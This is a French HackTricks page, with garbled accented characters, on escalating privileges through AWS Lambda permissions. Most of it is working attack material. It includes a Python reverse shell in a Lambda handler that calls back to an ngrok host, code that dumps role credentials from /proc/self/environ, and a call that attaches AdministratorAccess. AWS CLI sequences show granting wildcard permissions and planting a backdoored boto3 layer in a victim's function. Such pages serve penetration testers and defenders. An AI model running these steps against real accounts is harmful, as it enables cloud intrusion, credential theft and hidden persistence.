# AWS - √âl√©vation de privil√®ges Lambda

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

- Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
- D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
- **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## lambda

Plus d'informations sur lambda dans :

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Les utilisateurs ayant les autorisations **`iam:PassRole`, `lambda:CreateFunction` et `lambda:InvokeFunction`** peuvent √©lever leurs privil√®ges.\
Ils peuvent **cr√©er une nouvelle fonction Lambda et lui attribuer un r√¥le IAM existant**, accordant √† la fonction les autorisations associ√©es √† ce r√¥le. L'utilisateur peut ensuite **√©crire et t√©l√©charger du code dans cette fonction Lambda (avec par exemple un shell invers√©)**.\
Une fois la fonction configur√©e, l'utilisateur peut **d√©clencher son ex√©cution** et les actions pr√©vues en invoquant la fonction Lambda via l'API AWS. Cette approche permet effectivement √† l'utilisateur d'effectuer des t√¢ches indirectement via la fonction Lambda, en op√©rant avec le niveau d'acc√®s accord√© au r√¥le IAM qui lui est associ√©.\\

Un attaquant pourrait abuser de cela pour obtenir un **shell invers√© et voler le jeton** :

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Vous pourriez √©galement **abuser des autorisations du r√¥le lambda** √† partir de la fonction lambda elle-m√™me.\
Si le r√¥le lambda avait suffisamment d'autorisations, vous pourriez l'utiliser pour vous accorder des droits d'administrateur :
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Il est √©galement possible de divulguer les informations d'identification du r√¥le de la lambda sans avoir besoin d'une connexion externe. Cela serait utile pour les **Lambdas isol√©es du r√©seau** utilis√©es pour des t√¢ches internes. Si des groupes de s√©curit√© inconnus filtrent vos shells invers√©s, ce morceau de code vous permettra de divulguer directement les informations d'identification en tant que sortie de la lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Impact potentiel :** √âl√©vation de privil√®ges directe vers le r√¥le de service lambda arbitraire sp√©cifi√©.

{% hint style="danger" %}
Notez que m√™me si cela peut sembler int√©ressant **`lambda:InvokeAsync`** ne permet pas √† lui seul d'**ex√©cuter `aws lambda invoke-async`**, vous avez √©galement besoin de `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Comme dans le sc√©nario pr√©c√©dent, vous pouvez **vous accorder la permission `lambda:InvokeFunction`** si vous avez la permission **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Impact potentiel :** √âl√©vation de privil√®ges directe vers le r√¥le de service lambda arbitraire sp√©cifi√©.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Les utilisateurs ayant les autorisations **`iam:PassRole`, `lambda:CreateFunction` et `lambda:CreateEventSourceMapping`** (et potentiellement `dynamodb:PutItem` et `dynamodb:CreateTable`) peuvent **√©lever indirectement leurs privil√®ges** m√™me sans `lambda:InvokeFunction`.\
Ils peuvent cr√©er une **fonction Lambda avec un code malveillant et lui attribuer un r√¥le IAM existant**.

Au lieu d'invoquer directement la Lambda, l'utilisateur met en place ou utilise une table DynamoDB existante, la reliant √† la Lambda via un mapping de source d'√©v√©nement. Cette configuration garantit que la fonction Lambda est **d√©clench√©e automatiquement lors de l'ajout d'un nouvel √©l√©ment** dans la table, soit par l'action de l'utilisateur, soit par un autre processus, invoquant ainsi indirectement la fonction Lambda et ex√©cutant le code avec les autorisations du r√¥le IAM transmis.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Si DynamoDB est d√©j√† actif dans l'environnement AWS, l'utilisateur doit simplement **√©tablir la correspondance de la source d'√©v√©nements** pour la fonction Lambda. Cependant, si DynamoDB n'est pas utilis√©, l'utilisateur doit **cr√©er une nouvelle table** avec le streaming activ√©:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Maintenant, il est possible de **connecter la fonction Lambda √† la table DynamoDB** en **cr√©ant un mappage de source d'√©v√©nement**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Avec la fonction Lambda li√©e au flux DynamoDB, l'attaquant peut **d√©clencher indirectement la Lambda en activant le flux DynamoDB**. Cela peut √™tre r√©alis√© en **ins√©rant un √©l√©ment** dans la table DynamoDB :
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Impact potentiel :** √âl√©vation de privil√®ges directe vers le r√¥le de service lambda sp√©cifi√©.

### `lambda:AddPermission`

Un attaquant avec cette autorisation peut **s'octroyer lui-m√™me (ou √† d'autres) n'importe quelle permission** (cela g√©n√®re des strat√©gies bas√©es sur les ressources pour accorder l'acc√®s √† la ressource) :

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Impact potentiel :** √âl√©vation de privil√®ges directe vers le r√¥le de service lambda en accordant la permission de modifier le code et de l'ex√©cuter.

### `lambda:AddLayerVersionPermission`

Un attaquant avec cette permission peut **s'accorder lui-m√™me (ou √† d'autres) la permission `lambda:GetLayerVersion`**. Il pourrait acc√©der √† la couche et rechercher des vuln√©rabilit√©s ou des informations sensibles.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Impact potentiel :** Acc√®s potentiel √† des informations sensibles.

### `lambda:UpdateFunctionCode`

Les utilisateurs d√©tenant l'autorisation **`lambda:UpdateFunctionCode`** ont le potentiel de **modifier le code d'une fonction Lambda existante li√©e √† un r√¥le IAM.**\
L'attaquant peut **modifier le code de la fonction lambda pour exfiltrer les informations d'identification IAM**.

Bien que l'attaquant puisse ne pas avoir la capacit√© directe d'invocation de la fonction, si la fonction Lambda est pr√©existante et op√©rationnelle, il est probable qu'elle sera d√©clench√©e √† travers des flux de travail ou des √©v√©nements existants, facilitant ainsi indirectement l'ex√©cution du code modifi√©.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Impact potentiel :** Privil√®ge d'escalade direct vers le r√¥le de service lambda utilis√©.

### `lambda:UpdateFunctionConfiguration`

#### Introduction

[**Couches Lambda**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) permet d'inclure du **code** dans votre fonction lambda mais de le **stocker s√©par√©ment**, ainsi le code de la fonction peut rester petit et **plusieurs fonctions peuvent partager du code**.

√Ä l'int√©rieur de lambda, vous pouvez v√©rifier les chemins √† partir desquels le code Python est charg√© avec une fonction comme celle-ci :
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Voici les emplacements :

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Par exemple, la biblioth√®que boto3 est charg√©e depuis `/var/runtime/boto3` (4e position).

#### Exploitation

Il est possible d'abuser de l'autorisation `lambda:UpdateFunctionConfiguration` pour **ajouter une nouvelle couche** √† une fonction lambda. Pour ex√©cuter du code arbitraire, cette couche doit contenir une **biblioth√®que que la lambda va importer.** Si vous pouvez lire le code de la lambda, vous pourriez trouver cela facilement, notez √©galement qu'il est possible que la lambda **utilise d√©j√† une couche** et que vous pourriez **t√©l√©charger** la couche et **ajouter votre code** dedans.

Par exemple, supposons que la lambda utilise la biblioth√®que boto3, cela cr√©era une couche locale avec la derni√®re version de la biblioth√®que :
```
pip3 install -t ./lambda_layer boto3
```
Vous pouvez ouvrir `./lambda_layer/boto3/__init__.py` et **ajouter la porte d√©rob√©e dans le code global** (une fonction pour exfiltrer des informations d'identification ou obtenir un shell invers√© par exemple).

Ensuite, compressez le r√©pertoire `./lambda_layer` et **t√©l√©versez la nouvelle couche lambda** dans votre propre compte (ou dans celui de la victime, mais vous pourriez ne pas avoir les autorisations n√©cessaires pour cela).\
Notez que vous devez cr√©er un dossier python et y placer les biblioth√®ques pour remplacer /opt/python/boto3. De plus, la couche doit √™tre **compatible avec la version de python** utilis√©e par la lambda et si vous la t√©l√©versez dans votre compte, elle doit √™tre dans la **m√™me r√©gion :**

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

Maintenant, rendez la couche lambda t√©l√©charg√©e **accessible par n'importe quel compte** :
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Et attachez la couche lambda √† la fonction lambda de la victime :
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
La prochaine √©tape serait soit d'**appeler la fonction** nous-m√™mes si nous le pouvons, soit d'attendre qu'elle soit **appel√©e** de mani√®re normale - ce qui est la m√©thode la plus s√ªre.

Une **mani√®re plus discr√®te d'exploiter cette vuln√©rabilit√©** peut √™tre trouv√©e dans :

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Impact potentiel :** √âl√©vation directe des privil√®ges vers le r√¥le de service lambda utilis√©.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Peut-√™tre avec ces autorisations, vous pouvez cr√©er une fonction et l'ex√©cuter en appelant l'URL... mais je n'ai pas pu trouver un moyen de le tester, donc faites-moi savoir si vous y arrivez !

### Lambda MitM

Certaines lambdas vont **recevoir des informations sensibles des utilisateurs en param√®tres.** Si vous obtenez une RCE dans l'une d'elles, vous pouvez exfiltrer les informations que d'autres utilisateurs lui envoient, v√©rifiez cela dans :

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## R√©f√©rences

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
